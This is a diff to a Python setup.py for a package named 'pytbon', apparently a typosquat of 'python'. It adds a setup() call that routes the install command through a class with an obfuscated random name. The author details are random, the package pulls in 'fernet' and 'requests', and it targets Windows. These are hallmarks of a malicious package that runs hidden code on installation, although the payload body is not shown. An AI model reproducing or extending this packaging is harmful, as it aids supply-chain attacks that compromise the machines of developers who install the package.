@@ -18,5 +18,22 @@ class bERTCywBVrVxsoMhgMvrcaOgMKuOPZlZyjXiQVBByvOAbrrZvZlhuZqOYoBaGiVVihEZTSyZda
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+    name="pytbon",
+    version=VERSION,
+    author="JxZWmOZrkxvyUyvwz",
+    author_email="pcDOkEoJWQrNO@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': bERTCywBVrVxsoMhgMvrcaOgMKuOPZlZyjXiQVBByvOAbrrZvZlhuZqOYoBaGiVVihEZTSyZdaRWEFLmwdU,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
